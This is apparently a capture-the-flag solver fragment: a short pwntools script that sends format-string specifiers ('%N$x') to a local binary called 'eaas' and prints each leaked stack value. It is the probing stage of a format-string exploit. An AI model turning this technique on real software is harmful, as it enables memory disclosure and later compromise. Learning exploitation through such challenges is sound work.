from pwn import *

elf = context.binary = ELF('./eaas')

p = process(level='error')

for i in range(100):
    try:
        p.sendline('%{}$x'.format(i).encode())
        result = p.recvline().decode()
        if result:
            print(str(i) + ': ' + str(result).strip())
    except EOFError:
        pass